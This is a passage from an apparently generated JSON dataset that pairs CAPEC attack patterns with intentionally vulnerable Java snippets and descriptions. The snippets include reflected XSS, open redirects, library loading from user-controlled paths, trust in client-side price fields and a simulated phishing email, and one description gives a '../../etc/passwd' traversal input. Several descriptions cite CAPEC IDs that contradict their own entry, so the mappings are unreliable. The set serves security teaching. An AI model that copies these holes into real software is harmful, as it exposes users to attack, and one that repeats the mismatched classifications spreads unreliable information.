        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.Socket;\n\npublic class VulnerableClient {\n    public static void main(String[] args) {\n        String serverAddress = \"example.com\";\n        int port = 12345;\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStreamWriter out = new OutputStreamWriter(socket.getOutputStream());\n             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n\n            // Sending sensitive information in cleartext\n            String sensitiveData = \"username:password\";\n            out.write(sensitiveData + \"\\n\");\n            out.flush();\n\n            // Reading server response\n            String response = in.readLine();\n            System.out.println(\"Server response: \" + response);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable client application that connects to a server and transmits sensitive information (username and password) in cleartext. The code embodies the main idea of the CAPEC 'Sniffing Network Traffic' by illustrating how an adversary could capture sensitive information due to the lack of encryption (CWE-311 and CWE-319). The code also highlights the potential for exposure of sensitive system information (CWE-497) and the risk of capture-replay attacks (CWE-294) if the transmitted data is intercepted. The client sends the sensitive data without any encryption, making it susceptible to network sniffing attacks."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class LibraryLoader {\n    public static void main(String[] args) {\n        String userSuppliedPath = args[0]; // CWE-73: External Control of File Name or Path\n        loadLibrary(userSuppliedPath);\n    }\n\n    public static void loadLibrary(String path) {\n        try {\n            // CWE-427: Uncontrolled Search Path Element\n            System.setProperty(\"java.library.path\", path);\n            // CWE-426: Untrusted Search Path\n            System.loadLibrary(\"exampleLibrary\");\n        } catch (UnsatisfiedLinkError e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an application loads a library from a user-supplied path. The `main` method takes a path as an argument and passes it to the `loadLibrary` method. The `loadLibrary` method sets the `java.library.path` system property to the user-supplied path and attempts to load a library named `exampleLibrary`. This can be exploited by an adversary to redirect the application's attempts to load the library to a malicious library under their control. This embodies the CAPEC 'Redirect Access to Libraries' by allowing an adversary to manipulate the execution flow to point to an adversary-supplied library. The related CWEs are CWE-73 (External Control of File Name or Path), CWE-426 (Untrusted Search Path), and CWE-427 (Uncontrolled Search Path Element)."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String script = request.getParameter(\"script\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<script>\" + script + \"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where user input is directly embedded into a web page without proper validation or neutralization. The 'script' parameter from the HTTP request is included in a <script> tag within the HTML response. This can lead to Cross-Site Scripting (XSS) attacks, as described in CWE-79. The code does not validate the origin of the input (CWE-346) and improperly handles scripting syntax in the HTTP response (CWE-644). This example embodies the main idea of CAPEC-111, where an attacker can exploit script-based APIs to execute malicious scripts in the context of the web application."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableNetworkCommunication {\n    public static void main(String[] args) {\n        try {\n            String targetUrl = \"http://example.com/api/data\"; // CWE-941: Incorrectly Specified Destination\n            URL url = new URL(targetUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            // No validation of the endpoint's identity\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                // CWE-924: Improper Enforcement of Message Integrity During Transmission\n                // No integrity check on the received message\n\n                System.out.println(\"Response: \" + response.toString());\n            } else {\n                System.out.println(\"GET request failed\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable network communication scenario where an attacker can manipulate the infrastructure to intercept or redirect network messages. The code attempts to connect to a specified URL and retrieve data without validating the endpoint's identity (CWE-923) or ensuring the integrity of the received message (CWE-924). Additionally, the destination URL is hardcoded and may be incorrectly specified (CWE-941), making it susceptible to manipulation. This example embodies the main idea of CAPEC-225 (Infrastructure Manipulation) by showing how improper handling of communication channels can lead to security vulnerabilities."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/purchase\")\npublic class PurchaseServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Vulnerable code: trusting client-side hidden fields\n        String itemId = request.getParameter(\"itemId\");\n        String itemPrice = request.getParameter(\"itemPrice\"); // Hidden field\n        String quantity = request.getParameter(\"quantity\");\n\n        // Calculate total price based on client-provided data\n        double totalPrice = Double.parseDouble(itemPrice) * Integer.parseInt(quantity);\n\n        // Process the purchase\n        processPurchase(itemId, totalPrice);\n\n        response.getWriter().write(\"Purchase successful. Total price: \" + totalPrice);\n    }\n\n    private void processPurchase(String itemId, double totalPrice) {\n        // Simulate purchase processing\n        System.out.println(\"Processing purchase for item \" + itemId + \" with total price \" + totalPrice);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where the server trusts client-side hidden fields for critical information such as item price. The 'itemPrice' parameter is taken directly from the client-side form, which can be manipulated by an attacker to alter the price of an item. This embodies the CAPEC of 'Manipulating Hidden Fields' and is related to several CWEs: CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-807 (Reliance on Untrusted Inputs in a Security Decision), and CWE-472 (External Control of Assumed-Immutable Web Parameter). The code calculates the total price based on the client-provided price and quantity, which can be exploited to perform eShoplifting by modifying the hidden 'itemPrice' field."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/redirect\")\npublic class OpenRedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n            response.sendRedirect(targetUrl);\n        } else {\n            response.getWriter().write(\"Invalid URL\");\n        }\n    }\n}\n\n@WebServlet(\"/phishingEmail\")\npublic class PhishingEmailServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String emailContent = request.getParameter(\"emailContent\");\n        String targetEmail = request.getParameter(\"targetEmail\");\n        // Simulate sending a phishing email\n        sendPhishingEmail(targetEmail, emailContent);\n        response.getWriter().write(\"Phishing email sent\");\n    }\n\n    private void sendPhishingEmail(String targetEmail, String emailContent) {\n        // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n        // CWE-1022: Use of Web Link to Untrusted Target with window.opener Access\n        String phishingLink = \"http://malicious-site.com?target=\" + targetEmail;\n        String fullEmailContent = emailContent + \"\\nClick here: \" + phishingLink;\n        // Simulate email sending (details omitted)\n        System.out.println(\"Sending email to: \" + targetEmail);\n        System.out.println(\"Email content: \" + fullEmailContent);\n    }\n}",
        "description": "This Java code snippet demonstrates a web application vulnerable to spear phishing attacks by incorporating several related CWEs. The `OpenRedirectServlet` class contains a vulnerability (CWE-601) where user-controlled input is used to redirect to an untrusted site, facilitating phishing attacks. The `PhishingEmailServlet` class simulates sending a phishing email, where the email content can be manipulated to include a malicious link (CWE-451 and CWE-1022). This link could lead to a site that misrepresents critical information or exploits the `window.opener` property to modify security-critical properties. The code represents the main idea of spear phishing by showing how an attacker can craft targeted emails with malicious links to deceive specific users."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import java.util.Scanner;\n\npublic class MobilePhishing {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"You have received a new message: 'Your account has been compromised. Please visit http://fakebank.com to secure your account.'\");\n        System.out.print(\"Enter your username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful. Your account is now secure.\");\n        } else {\n            System.out.println(\"Authentication failed. Please try again.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulate an authentication process\n        return \"user123\".equals(username) && \"pass123\".equals(password);\n    }\n}",
        "description": "This Java code snippet simulates a mobile phishing attack scenario. The user receives a fake message prompting them to visit a malicious website and enter their credentials. The code then asks for the username and password, simulating a phishing attempt to collect sensitive information. The `authenticate` method is a simple placeholder that checks the credentials against hardcoded values, representing a flawed authentication mechanism. This example highlights several weaknesses: UI misrepresentation (CWE-451) by displaying a misleading message, potential for authentication bypass by spoofing (CWE-290), and the use of single-factor authentication (CWE-308). The code demonstrates how an attacker might solicit sensitive information from a user through a phishing message."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "import java.io.*;\n\npublic class FileManipulationExample {\n    public static void main(String[] args) {\n        if (args.length < 1) {\n            System.out.println(\"Usage: java FileManipulationExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        File file = new File(filename);\n\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple file manipulation vulnerability. The program takes a filename as a command-line argument and reads the file's contents, printing each line to the console. The vulnerability lies in the fact that the filename is taken directly from user input without any validation or sanitization. This can lead to several issues, such as path traversal (CWE-22), where an attacker could provide a path like '../../etc/passwd' to read sensitive system files. Additionally, the code does not handle file extensions or names securely (CWE-646), and it relies on the user-supplied filename to determine the file to be read, which can be exploited to manipulate file processing. This example embodies the main idea of the CAPEC by showing how improper handling of file names and paths can lead to incorrect processing and potential security vulnerabilities."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "public class SystemResetExample {\n    private static boolean isAuthenticated = false;\n    private static int securitySetting = 1; // 1 means secure, 0 means insecure\n\n    public static void main(String[] args) {\n        // Simulate a power state transition\n        powerStateTransition();\n\n        // Attempt to reset system values\n        resetSystemValues();\n\n        // Check security setting after reset\n        if (securitySetting == 0) {\n            System.out.println(\"Security setting is insecure after reset!\");\n        } else {\n            System.out.println(\"Security setting is secure.\");\n        }\n    }\n\n    private static void powerStateTransition() {\n        // Simulate entering a low power state and waking up\n        System.out.println(\"Entering low power state...\");\n        System.out.println(\"Waking up from low power state...\");\n        // Improperly preserved integrity of hardware configuration state\n        securitySetting = 0; // Security setting becomes insecure after power state transition\n    }\n\n    private static void resetSystemValues() {\n        if (!isAuthenticated) {\n            // Missing authentication for critical function\n            System.out.println(\"Resetting system values without authentication...\");\n            securitySetting = 0; // Reset security setting to insecure value\n        } else {\n            System.out.println(\"Authenticated user. No reset performed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can force the system to reset values, leveraging potential weaknesses in the target's configuration. The code simulates a power state transition that improperly preserves the integrity of the hardware configuration state, setting a security-critical setting to an insecure value. Additionally, the resetSystemValues method lacks authentication, allowing an attacker to reset the security setting to an insecure state without proper authorization. This embodies the main idea of CAPEC-272 (Force the System to Reset Values) and highlights related CWEs such as Missing Authentication for Critical Function (CWE-306) and Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation (CWE-1304)."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataLogger {\n    private static final String TRACE_FILE = \"/tmp/trace.log\";\n\n    public static void main(String[] args) {\n        try {\n            // Simulate sensitive trace data collection\n            String sensitiveData = collectSensitiveData();\n            // Store sensitive trace data in an unprotected location\n            writeTraceData(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String collectSensitiveData() {\n        // Simulate collection of sensitive data\n        return \"Sensitive system information: [password=12345]\";\n    }\n\n    private static void writeTraceData(String data) throws IOException {\n        FileWriter writer = new FileWriter(new File(TRACE_FILE));\n        writer.write(data);\n        writer.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive trace data is collected and stored in an unprotected location, embodying the main idea of CAPEC-White Box Reverse Engineering. The code collects sensitive system information and writes it to a file in the /tmp directory, which is a common unprotected location. This example highlights CWE-1323 (Improper Management of Sensitive Trace Data) by storing sensitive data in an unprotected file, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by potentially exposing sensitive system information to unauthorized actors. The code is vulnerable to reverse engineering attacks, as an attacker with access to the file system can easily locate and read the sensitive trace data."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class ADSExample {\n    public static void main(String[] args) {\n        String filePath = \"example.txt\";\n        String adsPath = filePath + \":hiddenStream\";\n        String data = \"Sensitive data hidden in ADS\";\n\n        try {\n            // Create the main file\n            File file = new File(filePath);\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n\n            // Write data to the alternate data stream\n            FileOutputStream fos = new FileOutputStream(adsPath);\n            fos.write(data.getBytes());\n            fos.close();\n\n            System.out.println(\"Data written to ADS\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how to create and write to an Alternate Data Stream (ADS) in a Windows NTFS file system. The main file 'example.txt' is created, and then an ADS named 'hiddenStream' is attached to it. Sensitive data is written to this ADS, effectively hiding it from standard file system utilities. This embodies the CAPEC concept of using ADS to hide data or tools, which can be exploited by attackers. The code also touches on related CWEs, such as improper handling of ADS (CWE-69) and improper removal of sensitive information (CWE-212), by showing how sensitive data can be hidden in an ADS without proper detection or removal mechanisms."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class FootprintingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            int responseCode = conn.getResponseCode();\n            System.out.println(\"Response Code: \" + responseCode);\n\n            if (responseCode == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuffer response = new StringBuffer();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n                System.out.println(\"Response: \" + response.toString());\n            }\n        } catch (Exception e) {\n            // CWE-222: Truncation of Security-relevant Information\n            System.err.println(\"Error: \" + e.getMessage().substring(0, 10));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of footprinting by making an HTTP GET request to a specified URL and printing the response. The code embodies the main idea of CAPEC-170 (Footprinting) by engaging in probing activities to gather information about the target. It also incorporates related CWEs: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by printing the full response content, and CWE-222 (Truncation of Security-relevant Information) by truncating the error message to the first 10 characters, potentially obscuring important details about the error."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\npublic class WebAppFingerprinting {\n    public static void main(String[] args) {\n        String targetUrl = \"http://example.com\";\n        try {\n            HttpURLConnection connection = (HttpURLConnection) new URL(targetUrl).openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.connect();\n\n            int responseCode = connection.getResponseCode();\n            System.out.println(\"Response Code: \" + responseCode);\n\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            if (responseCode == 404) {\n                System.out.println(\"Error: Page not found\");\n            }\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            String serverInfo = connection.getHeaderField(\"Server\");\n            System.out.println(\"Server Info: \" + serverInfo);\n\n            // CWE-598: Use of GET Request Method With Sensitive Query Strings\n            URL sensitiveUrl = new URL(targetUrl + \"?password=secret\");\n            HttpURLConnection sensitiveConnection = (HttpURLConnection) sensitiveUrl.openConnection();\n            sensitiveConnection.setRequestMethod(\"GET\");\n            sensitiveConnection.connect();\n            System.out.println(\"Sensitive Response Code: \" + sensitiveConnection.getResponseCode());\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of web application fingerprinting. The code sends HTTP GET requests to a target URL and prints out the response code and server information. It also includes a request with a sensitive query string to illustrate CWE-598. The code highlights several vulnerabilities: CWE-209 by printing error messages that could contain sensitive information, CWE-497 by exposing server information through response headers, and CWE-598 by using GET requests with sensitive data in the query string. This information can be used by an attacker to identify the web application's software and version, which can then be exploited in further attacks."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter variable name: \");\n        String varName = scanner.nextLine();\n        System.out.print(\"Enter value: \");\n        String value = scanner.nextLine();\n\n        // Using eval to dynamically set a variable\n        try {\n            eval(varName + \" = '\" + value + \"'\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Simulated eval function\n    public static void eval(String code) throws Exception {\n        // This is a placeholder for actual dynamic code execution\n        System.out.println(\"Executing: \" + code);\n        // In a real scenario, this could be a security risk\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to CAPEC-77: Manipulating User-Controlled Variables. The code takes user input to dynamically set a variable name and its value using a simulated 'eval' function. This represents CWE-95 (Eval Injection) where user input is improperly neutralized before being used in a dynamic evaluation call. The 'eval' function here is a placeholder to illustrate the risk of executing user-controlled code, which can lead to arbitrary code execution. Additionally, the code does not properly restrict the scope of the variable (CWE-1126) and allows dynamic variable manipulation (CWE-627), making it susceptible to various attacks."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "import javax.swing.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class ActionSpoofingExample {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"Action Spoofing Example\");\n        JButton button = new JButton(\"Submit Query\");\n\n        // Vulnerable ActionListener\n        button.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                // User thinks this submits a query\n                System.out.println(\"Submitting query...\");\n                // But it actually downloads a file\n                downloadFile();\n            }\n        });\n\n        frame.getContentPane().add(button);\n        frame.setSize(300, 200);\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setVisible(true);\n    }\n\n    private static void downloadFile() {\n        // Simulate file download\n        System.out.println(\"Downloading file...\");\n    }\n}",
        "description": "This Java code snippet demonstrates an example of Action Spoofing. The user interface (UI) presents a button labeled 'Submit Query', leading the user to believe that clicking the button will submit a query. However, the ActionListener attached to the button actually triggers a file download instead. This misrepresentation of the button's action is a form of UI misrepresentation (CWE-451) and can be used to trick users into performing unintended actions. The code highlights the vulnerability where the intended action (submitting a query) is spoofed by a different action (downloading a file), embodying the main idea of CAPEC-139 (Action Spoofing)."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class FlashParameterInjection extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String flashParam = request.getParameter(\"flashParam\");\n        String htmlContent = \"<html><body>\" +\n                \"<embed src='movie.swf' FlashVars='\" + flashParam + \"'></embed>\" +\n                \"</body></html>\";\n        response.setContentType(\"text/html\");\n        response.getWriter().write(htmlContent);\n    }\n}\n",
        "description": "This Java servlet code demonstrates a Flash Parameter Injection vulnerability. The servlet takes a user-supplied parameter 'flashParam' from the HTTP request and directly embeds it into the HTML content without proper validation or sanitization. This allows an attacker to inject malicious global parameters into the Flash file embedded within the HTML document. The code snippet also touches on related CWEs: improper neutralization of special elements (CWE-1336) and unrestricted upload of dangerous types (CWE-434), as the user input is not sanitized and could include harmful content."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCodeInclusion {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java VulnerableCodeInclusion <url>\");\n            return;\n        }\n\n        String url = args[0];\n        try {\n            URL website = new URL(url);\n            BufferedReader in = new BufferedReader(new InputStreamReader(website.openStream()));\n            StringBuilder code = new StringBuilder();\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                code.append(inputLine).append(\"\\n\");\n            }\n            in.close();\n\n            // Simulate code execution\n            System.out.println(\"Executing code from: \" + url);\n            System.out.println(code.toString());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Code Inclusion' (CAPEC-242). The program takes a URL as an argument, retrieves the content from the specified URL, and simulates the execution of the retrieved code. This embodies CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it imports executable functionality from an external source. The code also touches on CWE-506 (Embedded Malicious Code) and CWE-94 (Improper Control of Generation of Code) by potentially including and executing malicious code from an untrusted source. The vulnerability is further highlighted by CWE-98 (Improper Control of Filename for Include/Require Statement in PHP Program) and CWE-913 (Improper Control of Dynamically-Managed Code Resources), as the input URL is not properly validated or restricted, leading to the inclusion of potentially harmful code."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "import java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class ConfigManipulation {\n    private Properties config;\n\n    public ConfigManipulation(String configFilePath) throws IOException {\n        config = new Properties();\n        try (FileInputStream fis = new FileInputStream(configFilePath)) {\n            config.load(fis);\n        }\n    }\n\n    public String getConfigValue(String key) {\n        return config.getProperty(key);\n    }\n\n    public static void main(String[] args) {\n        try {\n            ConfigManipulation cm = new ConfigManipulation(\"config.properties\");\n            String value = cm.getConfigValue(\"importantSetting\");\n            System.out.println(\"Config Value: \" + value);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to Configuration/Environment Manipulation (CAPEC-15). The code reads configuration settings from an external file ('config.properties') and uses these settings within the application. If an attacker can modify this external configuration file, they can influence the application's behavior. This embodies CWE-15 (External Control of System or Configuration Setting). The code does not include any validation or integrity checks on the configuration file, making it susceptible to manipulation. This lack of protection can lead to various security issues, such as unauthorized changes to important settings."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class VulnerableFileLoader {\n    public static void main(String[] args) {\n        String fileName = args[0]; // CWE-73: External Control of File Name or Path\n        loadFile(fileName);\n    }\n\n    public static void loadFile(String fileName) {\n        File file = new File(fileName);\n        if (file.exists()) { // CWE-706: Use of Incorrectly-Resolved Name or Reference\n            try (FileInputStream fis = new FileInputStream(file)) {\n                byte[] data = new byte[(int) file.length()];\n                fis.read(data);\n                System.out.println(\"File loaded: \" + fileName);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"File not found: \" + fileName);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file loading mechanism. The main idea of the CAPEC is represented by allowing an attacker to create a file with the same name as a protected or privileged file. The code takes a file name as input from the user (CWE-73: External Control of File Name or Path) and attempts to load it. If the file exists, it reads the file's content. The vulnerability lies in the fact that the application does not verify the file's location or its legitimacy, potentially allowing an attacker to place a malicious file in a directory that is searched before the legitimate file's directory (CWE-706: Use of Incorrectly-Resolved Name or Reference). This can lead to the application loading and executing the attacker's file instead of the intended protected file."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class FlashRedirectServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String targetUrl = request.getParameter(\"targetUrl\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            // Vulnerable to Open Redirect (CWE-601)\n            response.sendRedirect(targetUrl);\n        } else {\n            response.getWriter().write(\"No target URL provided.\");\n        }\n    }\n}\n",
        "description": "This Java servlet code demonstrates a vulnerability related to Cross-Site Flashing (CAPEC-139). The servlet takes a 'targetUrl' parameter from the HTTP request and redirects the user to that URL without any validation. This is an example of CWE-601 (URL Redirection to Untrusted Site), which can be exploited by an attacker to redirect users to malicious sites. The code snippet embodies the main idea of the CAPEC by showing how an attacker can control the URL parameter to execute arbitrary content, potentially leading to further exploits such as Cross-Site Scripting (CWE-79) or other attacks facilitated by improper input neutralization."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.Cookie;\n\n@WebServlet(\"/microservice\")\npublic class MicroserviceServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-598: Sensitive information in query string\n        String sensitiveData = request.getParameter(\"sensitiveData\");\n        \n        // CWE-539: Use of persistent cookies containing sensitive information\n        Cookie cookie = new Cookie(\"sessionID\", sensitiveData);\n        cookie.setMaxAge(60 * 60 * 24 * 7); // 1 week\n        response.addCookie(cookie);\n        \n        // CWE-219: Storing sensitive data under web root\n        String filePath = getServletContext().getRealPath(\"/sensitiveData.txt\");\n        java.nio.file.Files.write(java.nio.file.Paths.get(filePath), sensitiveData.getBytes());\n        \n        // CWE-433: Unparsed raw web content delivery\n        response.setContentType(\"text/plain\");\n        response.getWriter().write(sensitiveData);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates several vulnerabilities related to the CAPEC 'Calling Micro-Services Directly'. The servlet exposes a microservice endpoint '/microservice' that processes sensitive data via an HTTP GET request (CWE-598). The sensitive data is then stored in a persistent cookie (CWE-539) and written to a file under the web root directory (CWE-219). Additionally, the servlet delivers raw content without parsing (CWE-433). This code exemplifies how an attacker could exploit these vulnerabilities to gather information about the microservice's implementation and function, leading to further exploitation."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class AccessControlMisconfiguration {\n    public static void main(String[] args) {\n        // Incorrectly configured access control: sensitive file with world-writable permissions\n        File sensitiveFile = new File(\"/path/to/sensitive/file.txt\");\n        try {\n            if (!sensitiveFile.exists()) {\n                sensitiveFile.createNewFile();\n            }\n            // Setting world-writable permissions (CWE-732)\n            sensitiveFile.setWritable(true, false);\n            sensitiveFile.setReadable(true, false);\n            sensitiveFile.setExecutable(false, false);\n\n            // Writing sensitive data to the file\n            FileWriter writer = new FileWriter(sensitiveFile);\n            writer.write(\"Sensitive Information\");\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a misconfiguration of access control by setting world-writable permissions on a sensitive file. The file is created with permissions that allow any user to read and write to it, which is an example of CWE-732 (Incorrect Permission Assignment for Critical Resource). This misconfiguration can be exploited by an attacker to gain unauthorized access to sensitive information, embodying the main idea of the CAPEC 'Exploiting Incorrectly Configured Access Control Security Levels'. The code highlights the risk of improperly setting file permissions, which can lead to unauthorized access and potential data breaches."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
